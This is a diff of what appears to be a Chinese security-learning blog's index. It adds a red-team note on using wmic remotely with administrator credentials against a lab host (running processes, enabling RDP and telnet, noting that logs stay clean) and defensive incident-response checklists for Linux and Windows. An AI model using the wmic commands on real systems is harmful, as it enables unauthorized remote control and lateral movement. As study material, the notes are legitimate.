-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[dvd]</span><br><span class="line">name = dvd</span><br><span class="line">baseurl = file:///mnt/cdrom</span><br><span class="line">gpgcheck = 0</span><br><span class="line">enabled = 1</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置IP"><a href="#配置IP" class="headerlink" title="配置IP"></a>配置IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
-<h2 id="关闭selinux和防火墙"><a href="#关闭selinux和防火墙" class="headerlink" title="关闭selinux和防火墙"></a>关闭selinux和防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">getenforce</span><br><span class="line">systemctl disable firewalld.service</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
-<blockquote>
-<p>DHCP工作流程：<br>1 客户端发送广播向服务器申请IP地址<br>2 服务器收到请求后查看主配置文件dhcpd.conf，先根据客户端的mac地址查看是否为客户端设置了固定的IP地址<br>3 如果为客户端设置了固定的IP地址，则将该IP地址发送给客户端。如果没有设置固定IP地址，则将地址池中的IP地址发送给客户端。<br>4 客户端收到服务器回应后，客户端给与服务器回应，告诉已经使用了分配的IP地址。<br>5 服务器将相关租约信息存入数据库</p>
-</blockquote>
-<h2 id="安装DHCP"><a href="#安装DHCP" class="headerlink" title="安装DHCP"></a>安装DHCP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install dhcp</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/dhcp/dhcpd.conf</span><br></pre></td></tr></table></figure>
-<h2 id="修改dhcpd-conf-主配置文件"><a href="#修改dhcpd-conf-主配置文件" class="headerlink" title="修改dhcpd.conf 主配置文件"></a>修改dhcpd.conf 主配置文件</h2><p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"><br>将另一台虚拟机配置为DHCP自动获取IP<br>关闭VMware软件自带的DHCP功能<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/8.jpg"></p>
-<h2 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dhcpd</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>打开另一台虚拟机（Linux/windows），网卡改成vmnet8，把IP地址调成自动获取（dhcp），然后重启网络服务器。然后IP就应该自动获取了。<br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/10.jpg"><br><img src="/2021/04/05/Red-Hat-7%E9%85%8D%E7%BD%AEDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"><br>这样就算完成了</p>
-<hr>
-<blockquote>
-<p>对深海的恐惧，对深海的向往，人类源自海洋，我们回不去的故乡。​</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -496,6 +496,63 @@
       </tags>
   </entry>
   <entry>
+    <title>强大工具wmic的学习记录</title>
+    <url>/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>Windows 系统自带的 wmic 命令——内网大杀器！</p>
+<p>在用WMIC执行命令过程中，操作系统默认不会将WMIC的操作记录在日志中，因此也是红队必备！</p>
+<p><strong>但要记得</strong></p>
+<p>使用WMIC连接远程主机，需要目标主机开放135和445(135 端⼝是 WMIC 默认的管理端⼝,445是远程连接端口)</p>
+<p>可用<strong>netstat -an</strong>查看开放端口</p>
+<p>由于这几天比较急着学，所以只学暂时会用到的，本篇笔记不包含所有用法！【回头填坑，画大饼中】</p>
+<p>想要把回显的结果保存到文本里就在最后加上 <strong>&gt; D:\1.txt</strong> 即可</p>
+<h5 id="查看主机内的账号"><a href="#查看主机内的账号" class="headerlink" title="查看主机内的账号"></a>查看主机内的账号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic useraccount get name,SID</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; useraccount get name,SID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
+<span id="more"></span>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p>
+<h5 id="查看工作组-域"><a href="#查看工作组-域" class="headerlink" title="查看工作组/域"></a>查看工作组/域</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic computersystem get domain</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; computersystem get domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p>
+<h5 id="列出进程的核心信息"><a href="#列出进程的核心信息" class="headerlink" title="列出进程的核心信息"></a>列出进程的核心信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process list brief</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process list brief</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p>
+<h5 id="wmic开启3389端口"><a href="#wmic开启3389端口" class="headerlink" title="wmic开启3389端口"></a>wmic开启3389端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;QBY-11A2C3B9FAE&#x27; call SetAllowTSConnections 1</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p>
+<p>wmic开启telnet服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic SERVICE where name=&quot;tlntsvr&quot; call startservice   </span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; SERVICE where name=&quot;tlntsvr&quot; call startservice   </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p>
+<h5 id="获取可执行文件的路径"><a href="#获取可执行文件的路径" class="headerlink" title="获取可执行文件的路径"></a><strong>获取可执行文件的路径</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p>
+<h5 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a><strong>执行程序</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地：</span><br><span class="line">wmic process call create &quot;calc&quot;</span><br><span class="line">远程：(未成功打开)</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &quot;calc&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &#x27;cmd.exe /c calc&#x27;</span><br><span class="line">虽然回显了，但是那台靶机并没有弹出计算器，不晓得啥情况</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p>
+<p>这是两张本地验证。</p>
+<p>虽然在日志不留痕迹，但事实上如果本地有杀软还是会拦截并有弹窗提示。</p>
+<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/15.png"></p>
+<p>因此，对抗杀软也是学习安全必经之路。希望自己可以开个坑来琢磨一下~</p>
+<hr>
+<blockquote>
+<p>星光不问赶路人，时光不负有心人。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>我的内网学习之路</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>我的pwn学习之路——第二天</title>
     <url>/2022/03/23/%E6%88%91%E7%9A%84pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
     <content><![CDATA[<p>几天不摸，感觉又回到解放前了。</p>
@@ -543,6 +600,247 @@
       </categories>
       <tags>
         <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络安全应急响应Linux篇</title>
+    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
+    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
+<p>算是自己看书和学习的一个总结和整理。这里是对Linux的小总结</p>
+<p>【正在更新中,其实大部分需要掌握的基础部分写的差不多了，虽然坑没填完但也够看了】</p>
+<h1 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h1><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><h3 id="cpu信息"><a href="#cpu信息" class="headerlink" title="cpu信息"></a>cpu信息</h3><p>【lscpu】命令可查看cpu相关信息，包括型号、主频、内核等</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/1.png"></p>
+<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/3.png"></p>
+<span id="more"></span>
+
+<h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/4.png"></p>
+<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户信息"><a href="#查看系统所有用户信息" class="headerlink" title="查看系统所有用户信息"></a>查看系统所有用户信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/5.png"></p>
+<h3 id="分析超级权限账户"><a href="#分析超级权限账户" class="headerlink" title="分析超级权限账户"></a>分析超级权限账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/6.png"></p>
+<h3 id="查看可登录的账户"><a href="#查看可登录的账户" class="headerlink" title="查看可登录的账户"></a>查看可登录的账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep &#x27;/bin/bash&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/7.png"></p>
+<h3 id="查看用户错误的登录信息"><a href="#查看用户错误的登录信息" class="headerlink" title="查看用户错误的登录信息"></a>查看用户错误的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/8.png"></p>
+<h3 id="查看所有用户最后的登录信息"><a href="#查看所有用户最后的登录信息" class="headerlink" title="查看所有用户最后的登录信息"></a>查看所有用户最后的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog | more</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/9.png"></p>
+<h3 id="查看用户最近登录信息"><a href="#查看用户最近登录信息" class="headerlink" title="查看用户最近登录信息"></a>查看用户最近登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/10.png"></p>
+<h3 id="查看当前用户登录系统情况"><a href="#查看当前用户登录系统情况" class="headerlink" title="查看当前用户登录系统情况"></a>查看当前用户登录系统情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/11.png"></p>
+<h3 id="查看空口令账户"><a href="#查看空口令账户" class="headerlink" title="查看空口令账户"></a>查看空口令账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/12.jpg"></p>
+<h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/13.png"></p>
+<p>这条显示的命令为腾讯云的资源监控</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/14.jpg">                                    </p>
+<h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more #查看网络连接</span><br><span class="line"></span><br><span class="line">ls -alt /proc/【PID】#查看对应的可执行程序</span><br><span class="line"></span><br><span class="line">lsof -p PID #查看该进程打开的文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 PID #结束进程</span><br><span class="line"></span><br><span class="line">rm -rf filename #删除目标文件</span><br><span class="line"></span><br><span class="line">若删除不成功lsattr filename查看是否被加上i属性然后使用chattr -i filename移除i属性，在进行文件的删除</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  #查看隐藏进程123</span><br><span class="line"></span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">diff 1 2 #对比</span><br></pre></td></tr></table></figure>
+
+<p>可以用top查看资源占用情况，可针对性的重点排查cpu占用率较高的进程</p>
+<h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list  #查看系统运行的服务</span><br></pre></td></tr></table></figure>
+
+<p>等级0表示：表示关机</p>
+<p>等级1表示：单用户模式</p>
+<p>等级2表示：无网络连接的多用户命令行模式</p>
+<p>等级3表示：有网络连接的多用户命令行模式</p>
+<p>等级4表示：不可用</p>
+<p>等级5表示：带图形界面的多用户模式</p>
+<p>等级6表示：重新启动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all  #可查看所有服务的状态</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/15.png">        </p>
+<h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><blockquote>
+<p>“我不知道怎么形容，但它一直存在”</p>
+</blockquote>
+<hr>
+]]></content>
+      <categories>
+        <category>蓝队学习之路</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网络安全应急响应windows篇</title>
+    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/</url>
+    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
+<p>算是自己看书和学习的一个总结和整理。</p>
+<blockquote>
+<p>事件发生前未雨绸缪，事件发生后亡羊补牢。</p>
+</blockquote>
+<p>顺便想提一下书中在1.3中所写的一个机构、企业网络安全应急响应应具备的能力。</p>
+<p> <img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/0.jpg"></p>
+<p>这几个技能点稍加修改包装，简历不就又能加几行了吗（）</p>
+<p>常见网络安全应急响应场景：</p>
+<p>勒索病毒，挖矿木马，Webshell，网页篡改，DDoS攻击，数据泄露，流量劫持等</p>
+<p>应急响应分析流程如下：</p>
+<blockquote>
+<p>事件类型→时间范围→系统排查→进程排查→服务排查→文件痕迹检查→日志分析→(关联推理)→结论</p>
+</blockquote>
+<p>下面就是对技能点的简单总结。</p>
+<span id="more"></span>
+
+<hr>
+<h2 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h2><h3 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h3><h4 id="系统信息工具"><a href="#系统信息工具" class="headerlink" title="系统信息工具"></a>系统信息工具</h4><p>如果只是简单的了解可以通过命令行输入【systeminfo】该命令能查看主机名、操作系统版本等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/1.jpg"></p>
+<p>更详细一些的内容可以通过命令行输入【winmsd】或【msinfo32】(这个是前者的更新版本)</p>
+<p>例如靶机windows2003用的就是【winmsd】命令</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/2.jpg"></p>
+<p>win10电脑是【msinfo32】命令</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/3.jpg"></p>
+<h4 id="正在运行的任务"><a href="#正在运行的任务" class="headerlink" title="正在运行的任务"></a>正在运行的任务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【正在运行任务】选项，可以查看正在运行任务的名称、状态、路径</p>
+<p>进程ID等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/4.png"></p>
+<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【服务】选项，可以查看服务的名称、状态、路径等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/5.jpg"></p>
+<h4 id="系统驱动服务"><a href="#系统驱动服务" class="headerlink" title="系统驱动服务"></a>系统驱动服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【系统驱动程序】选项，可以查看系统驱动程序的名称、描述、文件等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/6.png"></p>
+<h4 id="加载的模块"><a href="#加载的模块" class="headerlink" title="加载的模块"></a>加载的模块</h4><p>在【系统信息】窗口中，单击【软件环境】中的【加载的模块】选项，可以查看加载的模块名称、路径等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/7.png"></p>
+<h4 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h4><p>在【系统信息】窗口中，单击【软件环境】中的【启动程序】选项，可以查看启动程序命令、用户名、位置等信息。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/8.png"></p>
+<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>Windows系统中排查恶意账户有以下4种方法：</p>
+<h4 id="1-命令行方法【无法看到隐藏账户】"><a href="#1-命令行方法【无法看到隐藏账户】" class="headerlink" title="1.命令行方法【无法看到隐藏账户】"></a>1.命令行方法【无法看到隐藏账户】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user   #查看用户（不包括隐藏用户）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/9.png"></p>
+<p>进一步收集账户信息可加上username</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/10.png"></p>
+<h4 id="2-图形界面方法"><a href="#2-图形界面方法" class="headerlink" title="2.图形界面方法"></a>2.图形界面方法</h4><p>我的电脑→右键→管理→计算机管理（本地）→本地用户和组→用户</p>
+<p>或者在命令行输入【lusrmgr.msc】</p>
+<p>可以看到带$的隐藏账户</p>
+<h4 id="3-注册表方法"><a href="#3-注册表方法" class="headerlink" title="3.注册表方法"></a>3.注册表方法</h4><p>在命令行中输入【regedit】即可打开注册表编辑器</p>
+<p>选择【HKEY_LOCAL_MACHINE】下的【SAM】选项，右键点击权限界面并进入高级安全设置，更改权限然后才能看到东西，不然啥也看不到。</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/11.png"></p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/12.png"></p>
+<p>双击Users文件夹可以看到对应账号F值的二进制数据（可右键导出），若发现两个账号相同 ，则发现克隆账号。</p>
+<h4 id="4-wmic方法"><a href="#4-wmic方法" class="headerlink" title="4.wmic方法"></a>4.wmic方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,SID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/13.png"></p>
+<h3 id="Windows启动项"><a href="#Windows启动项" class="headerlink" title="Windows启动项"></a>Windows启动项</h3><blockquote>
+<p>启动项是病毒后门等实现持久化驻留的一种常用方法，在应急响应中也是排查的必要项目</p>
+</blockquote>
+<h4 id="1-通过【系统配置】对话框查看"><a href="#1-通过【系统配置】对话框查看" class="headerlink" title="1.通过【系统配置】对话框查看"></a>1.通过【系统配置】对话框查看</h4><p>Win+R 输入【msconfig】即可</p>
+<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/14.png"></p>
